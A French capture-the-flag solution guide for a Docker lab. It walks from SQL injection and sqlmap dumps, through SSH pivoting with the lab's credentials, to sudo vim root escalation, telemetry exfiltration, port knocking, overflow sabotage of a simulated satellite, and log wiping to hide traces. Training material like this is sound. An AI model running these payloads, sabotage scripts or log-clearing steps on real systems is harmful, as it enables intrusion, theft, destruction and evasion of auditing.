# SOLUTION GUIDE - OPERATION NIGHTFIRE

## WALKTHROUGH COMPLET

### PHASE 1: COMPROMISSION DMZ (SQL INJECTION)

**Objectif:** Obtenir l'accès initial via le site web

**Étape 1.1 - Découverte**
- Accéder à http://localhost:8080
- Tester le formulaire de connexion

**Étape 1.2 - SQL Injection**

Payload classique pour bypass authentication:
```
Username: admin' OR '1'='1' -- 
Password: anything
```

Ou:
```
Username: ' OR 1=1 -- 
Password: 
```

**Étape 1.3 - Extraction de données**

SQLMap peut être utilisé:
```bash
sqlmap -u "http://localhost:8080/login.php" --data="username=test&password=test" --dbs
sqlmap -u "http://localhost:8080/login.php" --data="username=test&password=test" -D northshield_clients --tables
sqlmap -u "http://localhost:8080/login.php" --data="username=test&password=test" -D northshield_clients -T internal_systems --dump
```

**Tables importantes à dumper:**
- `internal_systems` : Contient IP, users, passwords pour le réseau internal
- `admin_notes` : Notes avec indices pour la suite

**Informations clés obtenues:**
- file-server IP: 172.22.0.10
- User: fileadmin
- Clé SSH: /root/.ssh/id_rsa (sur db-server)
- developer user: D3v2024!Secure

---

### PHASE 2: PIVOT VERS INTERNAL

**Objectif:** Utiliser db-server comme pivot pour accéder au réseau internal

**Étape 2.1 - Extraction des credentials SSH du db-server**

Depuis la SQL injection, extraire la table `internal_systems`:

```bash
sqlmap -u "http://localhost:8080/login.php" --data="username=test&password=test" \
  -D northshield_clients -T internal_systems --dump
```

**Informations clés obtenues:**
- DB Server IP: `172.21.0.11`
- SSH User: `dbadmin`
- SSH Password: `DbAdm1n2024!`
- Clé SSH pour file-server: `/home/dbadmin/.ssh/id_rsa`

**Étape 2.2 - Connexion SSH au db-server**

Depuis votre machine attaquante (ou depuis le conteneur web-client):

```bash
# Option A: Depuis votre machine (via le port exposé)
ssh dbadmin@localhost -p 2222  # Si port 22 du db-server mappé sur 2222

# Option B: Depuis le réseau Docker
docker exec -it nightfire-web bash
ssh dbadmin@172.21.0.11
# Password: DbAdm1n2024!
```

**Note importante:** Le db-server est maintenant votre point de pivot. Le firewall n'autorise que le db-server à se connecter au file-server.

**Étape 2.3 - Récupération de la clé SSH pour file-server**

Maintenant que vous êtes sur le db-server:

```bash
# Vérifier la clé SSH
ls -la /home/dbadmin/.ssh/
cat /home/dbadmin/.ssh/id_rsa

# La clé est déjà prête à être utilisée
```

**Étape 2.4 - SSH vers file-server (depuis db-server)**

Depuis le db-server, vous pouvez maintenant accéder au file-server:

```bash
# Vous êtes sur db-server, maintenant SSH vers file-server
ssh -i /home/dbadmin/.ssh/id_rsa fileadmin@172.22.0.10
```

Le firewall autorise uniquement db-server (172.21.0.11) à se connecter à file-server (172.22.0.10).

**Étape 2.5 - Exploration du file-server**

```bash
# Explorer les partages
ls -la /share/
ls -la /share/satellite_docs/
ls -la /share/employee_files/

# Lire la documentation critique
cat /share/satellite_docs/ARGOS7B_TECHNICAL_DOC.md
```

**Informations clés obtenues:**
- IP Satellite: 172.24.0.10
- Port SSH satellite: 8976
- Credentials satellite: satadmin / S4t3ll1t3@ARGOS!
- IP Control Station: 172.23.0.20
- Credentials Control Station: ctrlops / Ctr10ps@2024!
- Workstation1 peut accéder à Control Station

---

### PHASE 3: ACCÈS À WORKSTATION1

**Objectif:** Accéder à la workstation de développement

**Étape 3.1 - SSH vers workstation1**

Depuis file-server:
```bash
ssh developer@172.22.0.20
Password: D3v2024!Secure
```

**Étape 3.2 - Exploration workstation1**

```bash
# Lire les notes
cat ~/notes/work_notes.md

# Vérifier les clés SSH
ls -la ~/.ssh/
cat ~/.ssh/control_station_rsa
```

**Informations clés:**
- Clé SSH pour Control Station disponible
- Credentials: ctrlops / Ctr10ps@2024!

---

### PHASE 4: ACCÈS À CONTROL STATION

**Objectif:** Atteindre la station de contrôle satellite et élever les privilèges

**Étape 4.1 - SSH vers Control Station**

Depuis workstation1:
```bash
ssh -i ~/.ssh/control_station_rsa ctrlops@172.23.0.20
# Ou avec password:
ssh ctrlops@172.23.0.20
Password: Ctr10ps@2024!
```

**Étape 4.2 - 🆕 DÉCOUVERTE: Lecture des notes**

Une fois connecté à Control Station:
```bash
# Lire le fichier d'accueil
cat ~/IMPORTANT.txt

# Explorer les notes système
ls ~/notes/
cat ~/notes/README.txt
cat ~/notes/system_notes.txt
cat ~/notes/satellite_access.txt
```

**Informations découvertes:**
- La clé SSH du satellite est dans `/root/.ssh/satellite_rsa`
- L'utilisateur `ctrlops` n'a pas accès direct à `/root/`
- Élévation de privilèges nécessaire
- Documentation du port knocking disponible

**Étape 4.3 - 🆕 ÉLÉVATION DE PRIVILÈGES (sudo exploitation)**

**4.3.1 - Vérifier les permissions sudo**

```bash
sudo -l
```

**Résultat attendu:**
```
User ctrlops may run the following commands on control-station:
    (root) NOPASSWD: /usr/bin/vim
```

**Observation:** Misconfiguration sudo ! L'utilisateur peut exécuter vim en tant que root sans mot de passe.

**4.3.2 - Exploitation via GTFOBins**

Méthode: Utiliser vim pour obtenir un shell root

```bash
# Lancer vim avec sudo
sudo vim

# Une fois dans vim, taper les commandes suivantes:
:set shell=/bin/bash
:shell
```

**Résultat:** Vous obtenez un shell root !

```bash
root@control-station:~#
```

**🏁 FLAG 5.5 (BONUS):** `NIGHTFIRE{privilege_escalation_master}` (+10 points)

**4.3.3 - Méthodes alternatives (si vim ne fonctionne pas)**

**Avec vim - méthode directe:**
```bash
sudo vim -c ':!/bin/bash'
```

**Avec vim - éditer sudoers (ne pas faire!):**
```bash
sudo vim /etc/sudoers
# Ajouter: ctrlops ALL=(ALL) NOPASSWD: ALL
```

**Note:** Ces techniques sont documentées sur GTFOBins: https://gtfobins.github.io/gtfobins/vim/

**Étape 4.4 - Récupération de la clé SSH satellite**

Maintenant que vous êtes root:
```bash
# Aller dans le répertoire root
cd /root/.ssh/

# Lire la clé privée
cat satellite_rsa

# Copier la clé pour l'utilisateur ctrlops (optionnel)
cp /root/.ssh/satellite_rsa /home/ctrlops/satellite_key.pem
chown ctrlops:ctrlops /home/ctrlops/satellite_key.pem
chmod 600 /home/ctrlops/satellite_key.pem

# Retourner à l'utilisateur ctrlops
exit
```

**Clé SSH satellite récupérée:** ✅

**Étape 4.5 - Exploration Control Station et outils**

Retourner à l'utilisateur ctrlops:
```bash
exit  # Sortir du shell root si nécessaire
```

En tant que ctrlops:
```bash
# Lire le guide utilisateur
cat ~/user_guide.txt

# Explorer les outils Ada disponibles
ls -la /opt/control_tools/

# Vérifier qu'on a maintenant accès à la clé satellite
ls -la ~/satellite_key.pem
# ou
sudo cat /root/.ssh/satellite_rsa
```

**Étape 4.6 - Exfiltration base de données télémétrie**

```bash
# Se connecter à la base de données télémétrie
mysql -h telemetry-db -u telemetry -pT3l3m3try2024! argos_telemetry

# Lister les tables
SHOW TABLES;

# Exfiltrer les coordonnées GPS des cibles surveillées
SELECT * FROM target_coordinates;

# Sauvegarder les données (optionnel)
mysql -h telemetry-db -u telemetry -pT3l3m3try2024! argos_telemetry \
  -e "SELECT * FROM target_coordinates" > /tmp/gps_targets.txt
```

**Coordonnées GPS critiques exfiltrées:**
- Base Militaire Alpha (France): 48.8566, 2.3522
- Site Nucléaire Zeta (Italie): 41.9028, 12.4964
- Complexe Gouvernemental Omega (Allemagne): 52.5200, 13.4050
- Etc.

---

### PHASE 5: ACCÈS SATELLITE ET SABOTAGE

**Objectif:** Infiltrer le satellite et provoquer son crash

**Étape 5.1 - 🆕 DÉCOUVERTE: Port SSH fermé**

Première tentative de connexion au satellite (depuis Control Station):
```bash
ssh -p 8976 satadmin@172.24.0.10
```

**Résultat:**
```
ssh: connect to host 172.24.0.10 port 8976: Connection refused
```

❌ **Problème:** Le port est fermé !

**Étape 5.2 - 🆕 LECTURE DE LA DOCUMENTATION (Port Knocking)**

Retour à la documentation sur Control Station:
```bash
cat ~/notes/satellite_access.txt
```

**Découverte CRITIQUE:**
- Le satellite utilise un système de **port knocking**
- Séquence requise: **7777 → 8888 → 9999**
- Délai maximum: 15 secondes entre chaque frappe
- Le port SSH 8976 s'ouvrira après la bonne séquence

**Étape 5.3 - 🆕 PORT KNOCKING (Ouverture du port)**

Depuis Control Station, effectuer la séquence de knock:

**Méthode A - Avec 'knock' (RECOMMANDÉ):**
```bash
knock 172.24.0.10 7777 8888 9999
```

**Méthode B - Avec 'nmap':**
```bash
for port in 7777 8888 9999; do
    nmap -Pn --host-timeout 100ms --max-retries 0 -p $port 172.24.0.10
done
```

**Méthode C - Avec 'netcat' (nc):**
```bash
nc -z 172.24.0.10 7777
nc -z 172.24.0.10 8888
nc -z 172.24.0.10 9999
```

**Méthode D - Script bash automatisé:**
```bash
#!/bin/bash
for port in 7777 8888 9999; do
    nc -z -w1 172.24.0.10 $port
    sleep 1
done
echo "Port knocking effectué! Tentez SSH maintenant."
```

**🏁 FLAG 7.5 (BONUS):** `NIGHTFIRE{secret_knock_revealed}` (+10 points)

**Étape 5.4 - Connexion SSH au satellite (après knock)**

**IMMÉDIATEMENT après le port knocking:**
```bash
# Avec la clé SSH
ssh -i /root/.ssh/satellite_rsa -p 8976 satadmin@172.24.0.10

# Ou avec mot de passe
ssh -p 8976 satadmin@172.24.0.10
Password: S4t3ll1t3@ARGOS!

# Ou depuis ctrlops avec la clé copiée
ssh -i ~/satellite_key.pem -p 8976 satadmin@172.24.0.10
```

**Résultat:**
```
Welcome to ARGOS-7B Satellite Control System
satadmin@argos7b:~$
```

✅ **Accès satellite réussi !**

**Note:** Le port se refermera automatiquement après 30 minutes. Si vous vous déconnectez, refaites le port knocking.

**Étape 5.5 - Exploration satellite**


```bash
# Lire le README
cat ~/README_SATELLITE.txt

# Explorer les codes Ada
cd /opt/satellite_control
ls -la

# Lire les codes sources
cat attitude_control.adb
cat propulsion_system.adb
```

**Étape 5.6 - Option de sabotage A: Buffer Overflow**

Exploiter la vulnérabilité dans `attitude_control`:

```bash
cd /opt/satellite_control
./attitude_control

# Envoyer une commande de plus de 256 caractères
Command> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

# Cela provoque un buffer overflow et crash le contrôle d'attitude
```

**Étape 5.7 - Option de sabotage B: Integer Overflow**

Exploiter la vulnérabilité dans `propulsion_system`:

```bash
cd /opt/satellite_control
./propulsion_system

Command> FIRE
Enter thruster: NORTH
Enter burn duration: -999999

# L'integer overflow cause des allumages incontrôlés des propulseurs
```

**Étape 5.8 - Option de sabotage C: Modification du code**

Créer un script de sabotage:

```bash
cat > /opt/satellite_control/sabotage.sh << 'EOF'
#!/bin/bash
# Script de sabotage - Allumage continu propulseurs

echo "Activation séquence de sabotage..."
echo "Allumage propulseurs en boucle..."

for i in {1..1000}; do
    echo "FIRE NORTH 1000" | /opt/satellite_control/propulsion_system
    sleep 0.1
    echo "FIRE SOUTH 1000" | /opt/satellite_control/propulsion_system
    sleep 0.1
    echo "FIRE EAST 1000" | /opt/satellite_control/propulsion_system
    sleep 0.1
    echo "FIRE WEST 1000" | /opt/satellite_control/propulsion_system
    sleep 0.1
done

echo "Carburant épuisé - Satellite en dérive!"
EOF

chmod +x /opt/satellite_control/sabotage.sh
./sabotage.sh
```

Ou modifier directement le code Ada:

```bash
vim /opt/satellite_control/propulsion_system.adb

# Modifier pour forcer des allumages répétés automatiques
# Recompiler:
gnatmake -o propulsion_system propulsion_system.adb

# Exécuter le code modifié
./propulsion_system
```

---

### PHASE 6: NETTOYAGE DES TRACES

**Objectif:** Effacer les logs pour faire passer le crash pour un bug

**Étape 6.1 - Nettoyage sur le satellite**

```bash
# Effacer les logs système
echo "" > /var/log/satellite/system.log
echo "" > /var/log/satellite/telemetry.log

# Supprimer l'historique
history -c
rm ~/.bash_history
```

**Étape 6.2 - Nettoyage Control Station**

```bash
# Effacer les logs SSH
echo "" > /var/log/auth.log

# Nettoyer historique
history -c
rm ~/.bash_history
```

**Étape 6.3 - Nettoyage Telemetry DB**

```bash
mysql -h telemetry-db -u telemetry -pT3l3m3try2024! argos_telemetry

# Supprimer les logs d'accès suspects
DELETE FROM access_log WHERE ip_address NOT LIKE '172.23.%';

# Ou tout effacer:
TRUNCATE TABLE access_log;
```

**Étape 6.4 - Nettoyage des autres systèmes**

Remonter la chaîne en effaçant les traces:
- Workstation1: `history -c && rm ~/.bash_history`
- File-server: effacer logs Samba et SSH
- DB-server: nettoyer les logs d'accès MySQL
- Web-server: modifier /var/log/apache2/access.log

---

## TECHNIQUES ALTERNATIVES

### Tunneling SSH complet

Au lieu de SSH en cascade, créer un tunnel complet:

```bash
# Depuis la machine attaquante:
# Tunnel vers file-server via db-server
ssh -L 2222:172.22.0.10:22 -i db_key root@db-server

# Tunnel vers control-station via workstation1
ssh -L 3333:172.23.0.20:22 -i fileadmin_key -p 2222 fileadmin@localhost
ssh -L 4444:172.23.0.20:22 -i dev_key developer@workstation1

# Tunnel vers satellite via control-station
ssh -L 8976:172.24.0.10:8976 -i ctrlops_key ctrlops@control-station
ssh -p 8976 satadmin@localhost
```

### SSH ProxyJump

Utiliser ProxyJump pour simplifier:

```bash
# Config SSH (~/.ssh/config):
Host db-server
    HostName db-server-ip
    User root
    IdentityFile ~/.ssh/db_key

Host file-server
    HostName 172.22.0.10
    User fileadmin
    IdentityFile ~/.ssh/fileadmin_key
    ProxyJump db-server

Host workstation1
    HostName 172.22.0.20
    User developer
    ProxyJump file-server

Host control-station
    HostName 172.23.0.20
    User ctrlops
    ProxyJump workstation1

Host satellite
    HostName 172.24.0.10
    Port 8976
    User satadmin
    ProxyJump control-station

# Puis simplement:
ssh satellite
```

---

## INDICES PAR NIVEAU

**Indice Niveau 1 (SQL Injection):**
"Le formulaire de login ne valide pas correctement les entrées utilisateur. Essayez des techniques d'injection SQL classiques."

**Indice Niveau 2 (Pivot):**
"La table internal_systems contient des informations précieuses. Le db-server a une clé SSH spéciale."

**Indice Niveau 3 (File Server):**
"La documentation satellite se trouve sur le file-server. Cherchez dans /share/satellite_docs/"

**Indice Niveau 4 (Workstation):**
"La workstation du développeur contient une clé SSH pour la Control Station dans ~/.ssh/"

**Indice Niveau 5 (Control Station):**
"La Control Station possède la clé pour accéder au satellite. Port SSH custom: 8976"

**Indice Niveau 6 (Satellite):**
"Les codes Ada contiennent des vulnérabilités. Cherchez buffer overflow et integer overflow."

---

## SCORING (SUGGESTION)

- SQL Injection réussie: 10 points
- Accès file-server: 15 points
- Lecture documentation satellite: 10 points
- Accès workstation1: 10 points
- Accès control-station: 15 points
- Exfiltration coordonnées GPS: 15 points
- Accès satellite: 15 points
- Exploitation vulnérabilité Ada: 20 points
- Sabotage réussi: 20 points
- Nettoyage traces: 10 points

**Total: 140 points**

Temps bonus: -5 points par heure en moins que 8h

---

## CONSEILS PÉDAGOGIQUES

1. **Laisser chercher** mais donner indices après 30 min de blocage
2. **Valider chaque étape** avant de passer à la suivante
3. **Encourager la documentation** de leur progression
4. **Discuter éthique** de la sécurité offensive
5. **Débriefer** les techniques en fin de session

Bonne chance!
